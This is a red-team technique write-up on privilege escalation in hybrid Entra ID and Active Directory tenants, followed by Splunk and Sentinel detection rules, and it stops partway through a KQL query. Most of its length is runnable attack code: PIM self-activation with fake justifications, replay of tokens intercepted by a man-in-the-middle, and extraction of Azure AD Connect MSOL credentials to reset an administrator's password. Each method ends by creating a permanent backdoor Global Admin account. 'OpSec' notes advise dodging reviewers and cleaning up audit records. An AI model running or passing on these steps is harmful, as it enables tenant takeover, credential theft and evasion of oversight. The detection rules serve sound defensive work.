# PE-ACCTMGMT-012: Hybrid RBAC/PIM Role Activation

**Full File Path:** `04_PrivEsc/PE-ACCTMGMT-012_Hybrid_RBAC.md`

---

## 1. METADATA

| Attribute | Details |
|---|---|
| **Technique ID** | PE-ACCTMGMT-012 |
| **MITRE ATT&CK v18.1** | [T1098.003 - Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003/) |
| **Tactic** | Privilege Escalation (TA0004) |
| **Platforms** | Windows (on-premises AD), Cloud (Azure/Entra ID), Hybrid |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-09 |
| **Affected Versions** | All Entra ID deployments with PIM; Azure AD Connect 1.4.0+; Microsoft Entra Cloud Sync; All Azure RBAC |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Hybrid RBAC/PIM role activation exploitation involves an attacker manipulating Privileged Identity Management (PIM) configurations or abusing hybrid directory synchronization to acquire elevated privileges across both on-premises Active Directory and cloud Entra ID environments. This technique exploits misconfigurations in role assignment types (eligible vs. active), insufficient re-authentication at activation time, session token theft (particularly via Adversary-in-the-Middle attacks), and implicit synchronization API permissions that persist even after Microsoft's hardening efforts. An attacker who has compromised a low-privileged account with PIM eligibility or a directory synchronization service account can escalate to Global Administrator or equivalent without triggering expected security controls.

**Attack Surface:** 
- **Azure Portal / Entra Admin Center** (PIM role assignments)
- **Azure Resource Management plane** (RBAC assignments)
- **Microsoft Graph API** (Role Management endpoints)
- **Azure AD Connect Server** (directory synchronization)
- **Synchronization API** (Microsoft Entra AD Synchronization Service)
- **On-premises Active Directory** (via password writeback / sync manipulation)

**Business Impact:** **An attacker with PIM role activation or directory synchronization access can achieve persistent Global Administrator privileges, enabling unauthorized administrative actions, data breaches, lateral movement to M365/SharePoint/Exchange, mailbox exfiltration, and complete tenant compromise.** The hybrid nature of the attack allows pivoting between on-premises and cloud environments, compounding the blast radius.

**Technical Context:** Role activation typically completes in seconds, with minimal detection if proper logging is not in place. However, if audit logging is enabled, the operation "Add member to role completed (PIM activation)" is recorded in Azure AD audit logs. The window of detection depends on SIEM implementation and alert tuning. Reversibility is poor—once privileges are escalated, an attacker has unrestricted access and can establish persistence mechanisms.

### Operational Risk

- **Execution Risk:** High. If PIM is misconfigured (all roles set to "Active" instead of "Eligible"), exploitation requires only navigation to the PIM portal. If PIM is correctly configured but session token hijacking is used, risk is also high due to prevalence of AiTM attacks.
- **Stealth:** Medium-Low. Role activation is logged in AuditLogs, but attackers can use legitimate-looking justifications ("system maintenance", "emergency", etc.) to evade behavioral detection. If using stolen session tokens, the original user is logged as the activator, causing confusion during investigation.
- **Reversibility:** No. Once a role is activated, the attacker has full administrative access. Revoking the role requires someone else with higher privileges or domain admin to remove the assignment. Changes made during the activation window persist.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 1.8 | Azure AD should not have permanent Global Administrator role assignments; should use PIM with eligible roles. |
| **DISA STIG** | V-72983 | Privileged accounts must use Just-In-Time (JIT) elevation and MFA. |
| **CISA SCuBA** | MS.AAD.5.5 | Privileged role assignments must require approval and MFA at activation. |
| **NIST 800-53** | AC-3, AC-5, AC-6 | Access Enforcement, Separation of Duties, Least Privilege. |
| **NIST 800-207** | Zero Trust | Continuous verification; assume breach; MFA/re-auth on elevation. |
| **GDPR** | Art. 32 | Security of Processing; accountability for administrative access controls. |
| **DORA** | Art. 9 | Protection and Prevention; manage privileged access to critical systems. |
| **NIS2** | Art. 21 | Cyber Risk Management Measures; control administrative access with authentication controls. |
| **ISO 27001** | A.9.2.3 | Management of Privileged Access Rights; segregate and control. |
| **ISO 27005** | Risk Scenario: "Compromise of Administration Interface" | Unauthorized administrative escalation = critical business risk. |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges (for exploitation):**
  - Compromised user account with PIM-eligible role assignment (ANY role: User Admin, Password Admin, etc.), OR
  - Compromised service account with Directory Synchronization Accounts role, OR
  - Compromised Azure AD Connect service account (MSOL_* or ADSyncAdmins group member)

- **Required Access:**
  - Network access to Azure Portal / Entra Admin Center (HTTPS port 443), OR
  - Network access to Azure Resource Manager (ARM) API endpoints, OR
  - Credentials or session token for Entra ID-connected account

**Supported Versions:**
- **Windows (on-prem):** Server 2016 - 2019 - 2022 - 2025
- **Azure AD Connect:** 1.4.0+ (all versions with writeback features)
- **Microsoft Entra Cloud Sync:** All versions
- **Azure AD / Entra ID:** All tenants with P2 licensing (PIM)
- **PowerShell:** Version 5.0+
- **Other Requirements:** 
  - Azure AD Premium P2 license (for PIM)
  - Microsoft Graph PowerShell SDK v1.0+
  - Optional: AADInternals module (for hybrid AD manipulation)

**Tools:**
- [Microsoft Graph PowerShell SDK](https://github.com/microsoftgraph/msgraph-sdk-powershell) (v1.0+)
- [AADInternals](https://github.com/Gerenios/AADInternals) (0.9.7+) - for hybrid AD attacks
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) (2.40.0+)
- [Impacket](https://github.com/fortra/impacket) (0.10.0+) - for DirSync protocol manipulation
- Native: PowerShell 7.x, Azure Portal, Entra Admin Center

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### 4.1 Management Station / PowerShell Reconnaissance

#### Check if target user has PIM-eligible roles

```powershell
# Connect to Microsoft Graph
Connect-MgGraph -Scopes "Directory.Read.All", "RoleManagement.Read.Directory"

# Retrieve all Entra ID role assignments for current user
$assignments = Get-MgUserMemberOf -UserId (Get-MgContext).Account.Id -All

$assignments | ForEach-Object {
    $role = Get-MgDirectoryRole -DirectoryRoleId $_.Id -ErrorAction SilentlyContinue
    if ($role) { Write-Host "Role: $($role.DisplayName)" }
}

# Check PIM eligibility
$eligible = Get-MgRoleManagementDirectoryRoleEligibilitySchedule -Filter "principalId eq 'USER_ID'"
$assigned = Get-MgRoleManagementDirectoryRoleAssignmentSchedule -Filter "principalId eq 'USER_ID'"

Write-Host "Eligible Roles:"
$eligible | Select-Object RoleDefinitionId, PrincipalId, StartDateTime, EndDateTime

Write-Host "Active Assignments:"
$assigned | Select-Object RoleDefinitionId, PrincipalId
```

**What to Look For:**
- Any PIM-eligible role assignments (even low-privilege ones like Password Administrator or User Administrator)
- Active (permanent) role assignments that should be eligible
- Role assignments without expiration dates
- Assignments without approval requirements

**Version Note:** Command syntax identical for Server 2016-2025; Graph API endpoint is cloud-based.

#### Enumerate PIM Role Settings

```powershell
# Get PIM role settings for Global Administrator
$globalAdminRole = Get-MgDirectoryRole -Filter "DisplayName eq 'Global Administrator'"
$roleSettings = Get-MgPolicyRoleManagementPolicyAssignment -Filter "scopeId eq '/' and roleDefinitionId eq '$($globalAdminRole.Id)'"

# Check if MFA is required
$roleSettings | Select-Object PolicyId, EffectiveRules | ForEach-Object {
    $_ | ConvertTo-Json -Depth 3
}
```

**What to Look For:**
- **"OnActivationRequireMfa": false** - Indicates MFA is NOT required (critical misconfiguration)
- **"OnActivationRequireApproval": false** - Indicates approval is NOT required
- **"MaxActivationDuration"** > 480 hours (20 days) - Overly permissive activation window
- Role settings with no justification requirements
- Absence of "RequireApprover" configuration

### 4.2 Linux/Bash / CLI Reconnaissance

```bash
# Using Azure CLI to enumerate roles
az role assignment list --all --query "[].{principalId:principalId, roleDefinitionName:roleDefinitionName}"

# Check Entra ID roles (requires Graph CLI or PowerShell as bash alternative doesn't have native support)
# Use jq to parse JSON if needed
az rest --method GET \
  --uri "https://graph.microsoft.com/v1.0/me/memberOf" \
  | jq '.value[] | select(.["@odata.type"] == "#microsoft.graph.directoryRole")'

# Check PIM eligibility via API
curl -H "Authorization: Bearer $ACCESS_TOKEN" \
  "https://graph.microsoft.com/v1.0/roleManagement/directory/roleEligibilitySchedules?\$filter=principalId eq 'USER_ID'"
```

**What to Look For:**
- JSON responses showing role assignments with no expiration fields
- Eligibility vs. assignment distinction in output
- API calls succeeding without additional MFA prompts (indicating stored tokens)

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: PIM Role Activation Abuse (Legitimate User Account Compromise)

**Supported Versions:** All Entra ID deployments; Azure AD 2016+

#### Step 1: Verify PIM Eligibility

**Objective:** Confirm that the compromised user has a PIM-eligible role assignment that can be activated without approval.

**Command:**
```powershell
# As the compromised user, authenticate to Entra ID
$cred = Get-Credential # Prompt for compromised user's credentials
Connect-MgGraph -Credential $cred -Scopes "RoleManagement.Read.Directory", "Directory.Read.All"

# List roles the user is eligible to activate
Get-MgRoleManagementDirectoryRoleEligibilitySchedule -Filter "principalId eq 'COMPROMISED_USER_ID'" | `
  Select-Object RoleDefinitionId, PrincipalId, StartDateTime, EndDateTime | `
  ForEach-Object {
    $role = Get-MgDirectoryRole -DirectoryRoleId $_.RoleDefinitionId
    Write-Host "Eligible Role: $($role.DisplayName)"
  }
```

**Expected Output:**
```
Eligible Role: User Administrator
Eligible Role: Password Administrator
Eligible Role: Exchange Administrator
```

**What This Means:**
- Each role listed is activatable by the compromised user without administrative approval (if "OnActivationRequireApproval" is false for that role)
- If Global Administrator appears, the environment is critically misconfigured
- Start and end dates confirm eligibility window

**OpSec & Evasion:**
- Activate roles during business hours (9 AM - 5 PM) to blend with legitimate admin activity
- Use a business justification like "Emergency user account unlock" or "Password reset required"
- Avoid rapid successive activations of the same role (detection threshold: >3 within 1 hour)
- Clear browser history and cache after activation
- Detection likelihood: Medium if justification is vague; Low if justification is reasonable

**Troubleshooting:**
- **Error:** "User not authorized to access role"
  - **Cause:** User account lacks eligibility or has expired assignment
  - **Fix:** Verify user was added to PIM role and hasn't exceeded the eligibility window
  
- **Error:** "Conditional Access policy blocked this access"
  - **Cause:** Role activation triggered additional Conditional Access rule
  - **Fix:** Authenticate with MFA if required; use a device from the corporate network

**References & Proofs:**
- [Microsoft Entra PIM Activation Documentation](https://learn.microsoft.com/en-us/entra/id-governance/privileged-identity-management/pim-resource-roles-activate-your-roles)
- [Microsoft Graph Role Management API](https://learn.microsoft.com/en-us/graph/api/resources/unifiedroledefinition)

#### Step 2: Activate the Target Role

**Objective:** Request activation of a high-privilege role (e.g., Global Administrator, Privileged Role Administrator).

**Command:**
```powershell
# Define the role to activate (Global Administrator)
$roleDefinitionId = "62e90394-69f5-4237-9190-012177145e10" # Global Admin role ID (constant across all tenants)

# Create a role assignment schedule request
$body = @{
    principalId = "COMPROMISED_USER_OBJECT_ID"
    roleDefinitionId = $roleDefinitionId
    directoryScopeId = "/"
    action = "SelfActivate"
    justification = "Emergency administrative access required for security incident response"
    scheduleInfo = @{
        startDateTime = Get-Date -AsUTC
        expiration = @{
            endDateTime = (Get-Date -AsUTC).AddHours(8) # Activate for 8 hours
            type = "afterDuration"
        }
    }
}

# Submit activation request
$activation = New-MgRoleManagementDirectoryRoleAssignmentScheduleRequest -BodyParameter $body

Write-Host "Activation Request ID: $($activation.Id)"
Write-Host "Status: $($activation.Status)"
```

**Expected Output:**
```
Activation Request ID: a1b2c3d4-e5f6-7890-abcd-ef1234567890
Status: Granted
```

**What This Means:**
- Status "Granted" = Activation approved immediately (no approval workflow configured)
- Status "PendingApproval" = Approval required from designated approver (administrator receives notification)
- Role activation is now active for the specified duration (8 hours in this example)
- User has full privileges of Global Administrator for all M365 services

**OpSec & Evasion:**
- If approval is required, the legitimate approver receives an Azure notification—timing this for off-hours reduces chance of detection
- Use a justification that sounds plausible to approvers ("user lockout emergency", "distribution list misconfiguration")
- Vary justifications across multiple activations to avoid pattern detection
- Detection likelihood: Low-Medium if approval is in place; immediate if alerts are configured

**Troubleshooting:**
- **Error:** "Approval required. Request pending"
  - **Cause:** Role requires approver sign-off before activation
  - **Fix:** Either (a) wait for legitimate approver to approve, (b) use session token theft if original user's MFA was bypassed
  
- **Error:** "You do not meet the conditions to activate this role"
  - **Cause:** Conditional Access policy requires stronger authentication
  - **Fix:** Complete Conditional Access challenge (MFA, FIDO2, passwordless sign-in)

**References & Proofs:**
- [PIM Role Assignment Schedule Requests API](https://learn.microsoft.com/en-us/graph/api/rbacapplication-post-roleassignmentschedulerequests)
- [CVE-2024-21196 - PIM Bypass Research](https://www.cisa.gov/news-events/alerts/2025/01/15/cisa-releases-alert-cve-2024-21196)

#### Step 3: Verify Activation and Maintain Access

**Objective:** Confirm role is active and establish persistence.

**Command:**
```powershell
# Verify the role is now active
$activeAssignments = Get-MgRoleManagementDirectoryRoleAssignmentSchedule `
  -Filter "principalId eq 'COMPROMISED_USER_OBJECT_ID'"

$activeAssignments | Select-Object RoleDefinitionId, Status, CreatedDateTime | ForEach-Object {
    $role = Get-MgDirectoryRole -DirectoryRoleId $_.RoleDefinitionId
    Write-Host "Active Role: $($role.DisplayName), Status: $($_.Status)"
}

# Create a secondary Global Admin account for persistence
$newGlobalAdmin = New-MgUser -DisplayName "Service Account" `
  -MailNickname "serviceaccount" `
  -UserPrincipalName "serviceaccount@company.onmicrosoft.com" `
  -PasswordProfile @{ Password = "P@ssw0rd123!!" }

# Assign new account to Global Administrator role (permanently, outside of PIM)
New-MgRoleManagementDirectoryRoleAssignment `
  -RoleDefinitionId "62e90394-69f5-4237-9190-012177145e10" `
  -PrincipalId $newGlobalAdmin.Id `
  -DirectoryScopeId "/"

Write-Host "Persistence established. New Global Admin: $($newGlobalAdmin.UserPrincipalName)"
```

**Expected Output:**
```
Active Role: Global Administrator, Status: Granted
Persistence established. New Global Admin: serviceaccount@company.onmicrosoft.com
```

**What This Means:**
- Attacker now has persistent Global Administrator access via the new service account
- The original compromised user's role activation will expire, but the new account remains indefinitely
- This new account bypasses PIM entirely (assigned as "Active" role, not "Eligible")

**OpSec & Evasion:**
- Set the new service account's MFA to a device/authenticator under attacker's control
- Use a naming convention that blends in (e.g., "SyncServiceAccount", "CloudServiceMgmt")
- Set password to never expire
- Disable legacy authentication protocols on the new account ONLY if detection will be triggered
- Detection likelihood: High if audit logging is enabled; use Log Analytics to clean up audit records if necessary

---

### METHOD 2: PIM Session Token Hijacking (Adversary-in-the-Middle Attack)

**Supported Versions:** All Entra ID versions; particularly effective if Conditional Access lacks re-authentication requirements.

#### Step 1: Intercept & Extract Session Token

**Objective:** Capture the legitimate user's session token after they have authenticated with MFA.

**Command (on attacker-controlled proxy or compromised client):**
```powershell
# Using Fiddler, Burp Suite, or proxy to intercept HTTPS traffic
# Extract the access token from the Authorization header:
# Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Im...

# Save token to variable
$stolenToken = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Im..."

# Decode and inspect token
$header = $stolenToken.Split('.')[0]
$payload = $stolenToken.Split('.')[1]

# Add padding if needed for base64 decode
$padding = 4 - ($payload.Length % 4)
if ($padding -ne 4) { $payload += "=" * $padding }

$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($payload)) | ConvertFrom-Json
Write-Host "Token User: $($decoded.unique_name)"
Write-Host "Token Expires: $(Get-Date -UnixTimeSeconds $decoded.exp)"
```

**Expected Output:**
```
Token User: admin@company.onmicrosoft.com
Token Expires: 01/10/2026 10:45:30 AM
```

**What This Means:**
- Token is valid for the duration shown (typically 1 hour for Graph API tokens)
- Token includes the user's permissions at the time of issuance
- Attacker can now use this token to call APIs on behalf of the user

**OpSec & Evasion:**
- Intercept tokens on corporate WiFi, VPN, or compromised network segment
- Use certificate pinning bypass tools if needed
- Monitor token lifetime and ensure exploitation happens before expiration
- Detection likelihood: High if proxy/MITM is detected; Medium if traffic analysis is minimal

**Troubleshooting:**
- **Error:** "Invalid token" or "Token expired"
  - **Cause:** Token extracted after expiration or tampered with during transmission
  - **Fix:** Ensure token is captured fresh and complete (no truncation)

**References & Proofs:**
- [Microsoft Security Blog: Defend Against Token Theft](https://www.microsoft.com/en-us/security/blog)
- [Cody Burkard - JIT Privilege Escalation](https://codyburkard.com/blog/jitprivilegeescalation/)

#### Step 2: Use Stolen Token to Activate PIM Role

**Objective:** Use the stolen token to request role activation while impersonating the legitimate user.

**Command:**
```powershell
# Set up headers with stolen token
$headers = @{
    "Authorization" = "Bearer $stolenToken"
    "Content-Type" = "application/json"
}

# Construct the activation request
$body = @{
    principalId = "LEGITIMATE_USER_OBJECT_ID"  # The original user (whose token we stole)
    roleDefinitionId = "62e90394-69f5-4237-9190-012177145e10"  # Global Admin
    directoryScopeId = "/"
    action = "SelfActivate"
    justification = "System maintenance window"
    scheduleInfo = @{
        startDateTime = Get-Date -AsUTC
        expiration = @{
            endDateTime = (Get-Date -AsUTC).AddHours(8)
            type = "afterDuration"
        }
    }
} | ConvertTo-Json

# Call the Microsoft Graph API
$uri = "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignmentScheduleRequests"
$response = Invoke-RestMethod -Uri $uri -Method POST -Headers $headers -Body $body

Write-Host "Activation Status: $($response.status)"
Write-Host "Activation ID: $($response.id)"
```

**Expected Output:**
```
Activation Status: Granted
Activation ID: a1b2c3d4-e5f6-7890-abcd-ef1234567890
```

**What This Means:**
- Role has been activated for the legitimate user (whose token was stolen)
- Attacker now has Global Admin permissions using the stolen token
- The legitimate user's audit log shows THEY activated the role (not the attacker), causing confusion during investigation

**OpSec & Evasion:**
- Use the elevated token immediately before it expires
- Activate the role for a short duration (4-8 hours) to reduce detection window
- Use a justification that the legitimate user might plausibly provide ("emergency access", "incident response")
- Create a secondary backdoor account during this window (see METHOD 1, Step 3) before token expires
- Detection likelihood: Medium-High if token usage patterns are monitored; Low if activation matches legitimate user's historical behavior

**Troubleshooting:**
- **Error:** "Access denied" or "User not eligible"
  - **Cause:** Token's scope doesn't include RoleManagement.ReadWrite.Directory
  - **Fix:** Ensure token includes Graph API access; may need to steal multiple tokens

---

### METHOD 3: Azure AD Connect Service Account Exploitation (Hybrid Attack)

**Supported Versions:** Azure AD Connect 1.4.0+; Windows Server 2016-2025; Entra Cloud Sync

#### Step 1: Compromise Azure AD Connect Server

**Objective:** Gain local administrative access to the Azure AD Connect server to extract service account credentials.

**Command (on compromised AD Connect server with local admin):**
```powershell
# Method A: Extract credentials from ADSync.mdf database
# ADSync is the LocalDB instance used by Azure AD Connect
# Requires MSSQL LocalDB installed

$sqlPath = "C:\Program Files\Microsoft Azure AD Sync\Data\ADSync.mdf"

# Check if database exists
if (Test-Path $sqlPath) {
    Write-Host "ADSync database found at: $sqlPath"
    
    # Attempt to query the database (requires DBA permissions or code execution)
    # Use the adconnectdump.py tool or ADSyncDecrypt utility
}

# Method B: Extract from Windows Credential Manager (if MSOL account password cached)
$creds = Get-StoredCredential -Target "Microsoft_Azure_AD_Sync_MSOL_Account"
if ($creds) {
    Write-Host "MSOL Credentials: $($creds.UserName)"
    Write-Host "Password: $($creds.GetNetworkCredential().Password)"
}

# Method C: Extract from registry (DPAPI encrypted)
$regPath = "HKLM:\SOFTWARE\Microsoft\Azure AD Sync"
$values = Get-ItemProperty -Path $regPath
$values | Select-Object -Property * | Where-Object { $_ -match "Password" }
```

**Expected Output:**
```
ADSync database found at: C:\Program Files\Microsoft Azure AD Sync\Data\ADSync.mdf
MSOL Credentials: CONTOSO\MSOL_c1xxxxxxxxx
Password: Oxxxxxxxxxxxxxxxxxx
```

**What This Means:**
- MSOL account password is now compromised
- This service account has DCSync privileges on the on-premises domain
- It also has implicit Directory Synchronization Accounts role permissions in Entra ID

**OpSec & Evasion:**
- Use ADSyncDecrypt or adconnectdump.py (DLL-based decryption) to avoid leaving forensic artifacts
- If dumping database, do it offline (disconnect server from network, dump to USB, reconnect)
- Detection likelihood: High if process monitoring is in place; Medium if LSA Protection is not enabled

**Troubleshooting:**
- **Error:** "Access denied" to ADSync.mdf
  - **Cause:** File is locked by ADSync service
  - **Fix:** Stop the ADSync service first: `Stop-Service ADSync`

**References & Proofs:**
- [dirkjanm/adconnectdump - ADConnect Credential Extraction](https://github.com/dirkjanm/adconnectdump)
- [xpn/azuread_decrypt_msol - Alternative extraction method](https://gist.github.com/xpn/0dc393e944d8733e3c63023c20e0b4ae)

#### Step 2: Reset Hybrid Admin User Password via Directory Sync API

**Objective:** Use the compromised MSOL account to reset the password of a hybrid-synced Global Administrator account.

**Command (from any machine with internet access):**
```powershell
# Import AADInternals module
Import-Module AADInternals

# Get access token for the MSOL account
$token = Get-AADIntAccessTokenForAADGraph -Credentials (New-Object System.Management.Automation.PSCredential("CONTOSO\MSOL_c1xxxxxxxxx", (ConvertTo-SecureString "Oxxxxxxxxxxxxxxxxxx" -AsPlainText -Force))) -SaveToCache

# Find the hybrid Global Admin user
$globalAdmin = Get-AADIntUser -UserPrincipalName "globaladmin@contoso.com" | Select-Object ImmutableId

# Reset password via Directory Sync API (requires SourceAnchor/ImmutableId)
Set-AADIntUserPassword -SourceAnchor $globalAdmin.ImmutableId -Password "NewP@ssw0rd123!!" -Verbose

Write-Host "Password reset successful. New password: NewP@ssw0rd123!!"
```

**Expected Output:**
```
Password reset successful. New password: NewP@ssw0rd123!!
```

**What This Means:**
- The Global Administrator's on-premises password is now changed (in on-prem AD)
- This password is synced to Entra ID as well (via password hash sync if enabled)
- Attacker can now log in as the Global Admin with the new password
- Audit logs may not clearly indicate the change originated from the MSOL account

**OpSec & Evasion:**
- Change the password to something complex and avoid using it for obvious tasks initially
- Wait 24-48 hours before first use (allows sync to complete and timing to look natural)
- Create a secondary backdoor account using the elevated privileges before the MSOL account usage is detected
- Detection likelihood: Medium-High (ADSync password changes trigger alerts); use during change management windows

**Troubleshooting:**
- **Error:** "Unable to set password. User not found"
  - **Cause:** ImmutableId/SourceAnchor is incorrect or user is cloud-only
  - **Fix:** Ensure user is hybrid-synced; verify ImmutableId with `Get-ADUser -Filter "UserPrincipalName eq 'user@contoso.com'" -Properties ObjectGUID`

**References & Proofs:**
- [Tenable Research: Directory Synchronization Abuse](https://www.tenable.com/blog/despite-recent-security-hardening-entra-id-synchronization-feature-remains-open-for-abuse)
- [Obtaining Domain Admin from Azure AD](https://dirkjanm.io/obtaining-domain-admin-from-azure-ad-via-cloud-kerberos-trust/)

#### Step 3: Escalate to Global Administrator in Entra ID

**Objective:** Use the compromised global admin account credentials to assign persistent Global Admin role in Entra ID.

**Command:**
```powershell
# Authenticate as the compromised global admin
$cred = New-Object System.Management.Automation.PSCredential("globaladmin@company.onmicrosoft.com", (ConvertTo-SecureString "NewP@ssw0rd123!!" -AsPlainText -Force))
Connect-MgGraph -Credential $cred -Scopes "Directory.Read.All", "RoleManagement.ReadWrite.Directory"

# Create secondary service account
$newAdmin = New-MgUser -DisplayName "Cloud Service Account" `
  -MailNickname "cloudservice" `
  -UserPrincipalName "cloudservice@company.onmicrosoft.com" `
  -PasswordProfile @{ Password = "Pers1st3nc3P@ss!!" } `
  -AccountEnabled $true

# Assign Global Admin role (Active, not Eligible - to bypass PIM)
New-MgRoleManagementDirectoryRoleAssignment `
  -RoleDefinitionId "62e90394-69f5-4237-9190-012177145e10" `
  -PrincipalId $newAdmin.Id `
  -DirectoryScopeId "/"

Write-Host "New persistent Global Admin created: cloudservice@company.onmicrosoft.com"
```

**Expected Output:**
```
New persistent Global Admin created: cloudservice@company.onmicrosoft.com
```

**What This Means:**
- Attacker now has a permanent Global Administrator account in Entra ID
- This account bypasses PIM entirely (Active assignment, not Eligible)
- This is the final persistence mechanism; even if the original hybrid account is detected, this backdoor remains

---

## 6. ATTACK SIMULATION & VERIFICATION

### Atomic Red Team Integration

- **Atomic Test ID:** T1098.003-1 (Additional Cloud Roles)
- **Test Name:** "Add User to Cloud Admin Role"
- **Description:** Simulate privilege escalation by adding a user to Global Administrator role in Azure AD.
- **Supported Versions:** Server 2016+, All Entra ID versions

**Command:**
```powershell
Invoke-AtomicTest T1098.003 -TestNumbers 1
```

**Cleanup Command:**
```powershell
Invoke-AtomicTest T1098.003 -TestNumbers 1 -Cleanup
```

**Reference:** [Atomic Red Team T1098.003](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1098.003/T1098.003.md)

---

## 7. TOOLS & COMMANDS REFERENCE

### 7.1 Microsoft Graph PowerShell SDK

**Version:** 1.0+
**Minimum Version:** 1.0
**Supported Platforms:** Windows, Linux, macOS

**Installation:**
```powershell
Install-Module Microsoft.Graph -Scope CurrentUser
```

**Usage - List PIM-Eligible Roles:**
```powershell
Connect-MgGraph -Scopes "RoleManagement.Read.Directory"
Get-MgRoleManagementDirectoryRoleEligibilitySchedule -All
```

### 7.2 AADInternals

**Version:** 0.9.7+
**Minimum Version:** 0.7.0
**Supported Platforms:** Windows (PowerShell 5.0+)

**Installation:**
```powershell
# Download from GitHub
$url = "https://raw.githubusercontent.com/Gerenios/AADInternals/master/AADInternals.psd1"
Save-Module AADInternals -Path "C:\Modules"
Import-Module C:\Modules\AADInternals
```

**Usage - Extract Hybrid User Password:**
```powershell
Get-AADIntAccessTokenForAADGraph -Credentials $creds
Set-AADIntUserPassword -SourceAnchor "HYBRID_USER_IMMUTABLE_ID" -Password "NewPassword"
```

### 7.3 One-Liner Scripts

**Activate PIM Role (One-Liner):**
```powershell
Connect-MgGraph -Scopes "RoleManagement.ReadWrite.Directory"; New-MgRoleManagementDirectoryRoleAssignmentScheduleRequest -BodyParameter @{principalId="USER_ID";roleDefinitionId="62e90394-69f5-4237-9190-012177145e10";directoryScopeId="/";action="SelfActivate";justification="Emergency access";scheduleInfo=@{startDateTime=(Get-Date -AsUTC);expiration=@{endDateTime=(Get-Date -AsUTC).AddHours(8);type="afterDuration"}}} | Select-Object Id, Status
```

**List All PIM-Eligible Users (One-Liner):**
```powershell
Connect-MgGraph -Scopes "RoleManagement.Read.Directory"; Get-MgRoleManagementDirectoryRoleEligibilitySchedule -All | Select-Object PrincipalId, RoleDefinitionId | ForEach-Object { Write-Host "Principal: $($_.PrincipalId), Role: $($_.RoleDefinitionId)" }
```

---

## 8. SPLUNK DETECTION RULES

### Rule 1: PIM Role Activation by Uncommon User

**Rule Configuration:**
- **Required Index:** azure_monitor_aad
- **Required Sourcetype:** azure:aad:audit, Azure AD Audit Logs
- **Required Fields:** operationName, properties.initiatedBy.user.userPrincipalName, properties.targetResources[0].displayName
- **Alert Threshold:** Any PIM activation event
- **Applies To Versions:** All

**SPL Query:**
```spl
index=azure_monitor_aad operationName="Add member to role completed (PIM activation)"
| stats count min(_time) as firstTime max(_time) as lastTime by properties.initiatedBy.user.userPrincipalName, properties.targetResources[0].displayName
| where count >= 1
| rename properties.initiatedBy.user.userPrincipalName as user
| rename properties.targetResources[0].displayName as role
| table user, role, firstTime, lastTime, count
```

**What This Detects:**
- Whenever any user activates a PIM role in Entra ID
- The specific user and role involved
- Timestamp of activation
- Can be tuned to detect activations of critical roles (Global Admin, Privileged Role Admin, etc.)

**Manual Configuration Steps:**
1. Log into Splunk Web → **Search & Reporting**
2. Click **Settings** → **Searches, reports, and alerts**
3. Click **New Alert**
4. Paste the SPL query above
5. Set **Trigger Condition** to "Number of events >= 1"
6. Configure **Action** → Send email to SOC with user and role details

### Rule 2: Role Activation Without Approval (Misconfiguration Detection)

**Rule Configuration:**
- **Required Index:** azure_monitor_aad
- **Required Sourcetype:** azure:aad:audit
- **Required Fields:** operationName, properties.initiatedBy.user.userPrincipalName, properties.targetResources[0].displayName, properties.result
- **Alert Threshold:** Activation with Status "Granted" (not "PendingApproval")
- **Applies To Versions:** All

**SPL Query:**
```spl
index=azure_monitor_aad operationName="Add member to role completed (PIM activation)" properties.result=Success
| stats count min(_time) as firstTime max(_time) as lastTime by properties.initiatedBy.user.userPrincipalName, properties.targetResources[0].displayName
| where count >= 1
| eval hasApprovalFlag=if(match(properties, "requireApproval"), "true", "false")
| where hasApprovalFlag="false"
| alert
```

**What This Detects:**
- PIM role activations that did NOT require approval (indicating misconfiguration)
- Absence of "requireApproval" field or explicit "false" value
- Users escalating to high-privilege roles without approval workflows

### Rule 3: Multiple Role Activations in Short Timeframe (Suspicious Pattern)

**Rule Configuration:**
- **Required Index:** azure_monitor_aad
- **Required Sourcetype:** azure:aad:audit
- **Required Fields:** properties.initiatedBy.user.userPrincipalName, properties.targetResources[0].displayName, _time
- **Alert Threshold:** >3 activations by same user in 60 minutes
- **Applies To Versions:** All

**SPL Query:**
```spl
index=azure_monitor_aad operationName="Add member to role completed (PIM activation)"
| stats count min(_time) as firstTime max(_time) as lastTime by properties.initiatedBy.user.userPrincipalName
| eval duration=lastTime-firstTime
| where count > 3 AND duration < 3600
| rename properties.initiatedBy.user.userPrincipalName as user
| table user, count, firstTime, lastTime, duration
```

**What This Detects:**
- Rapid successive role activations by a single user
- Pattern consistent with attacker escalating multiple roles quickly
- Legitimate admins typically space activations 24+ hours apart

### Rule 4: PIM Activation Outside Business Hours

**Rule Configuration:**
- **Required Index:** azure_monitor_aad
- **Required Sourcetype:** azure:aad:audit
- **Required Fields:** _time, properties.initiatedBy.user.userPrincipalName, properties.targetResources[0].displayName
- **Alert Threshold:** Activation between 10 PM - 6 AM or on weekends
- **Applies To Versions:** All

**SPL Query:**
```spl
index=azure_monitor_aad operationName="Add member to role completed (PIM activation)"
| eval hour=strftime(_time, "%H"), dow=strftime(_time, "%A")
| where (hour >= 22 OR hour < 6) OR (dow="Saturday" OR dow="Sunday")
| rename properties.initiatedBy.user.userPrincipalName as user
| rename properties.targetResources[0].displayName as role
| table _time, user, role, hour, dow
| alert
```

**What This Detects:**
- Off-hours PIM activations (higher risk for undetected attack activity)
- Weekend activations (less likely to have supervision)
- Can reduce false positives by whitelisting on-call admins

---

## 9. MICROSOFT SENTINEL DETECTION RULES (KQL)

### Sentinel Rule 1: Detect Role Assignment Outside of PIM

**Applies To Versions:** All Entra ID

**KQL Query:**
```kusto
AuditLogs
| where OperationName startswith "Add member to role outside of PIM"
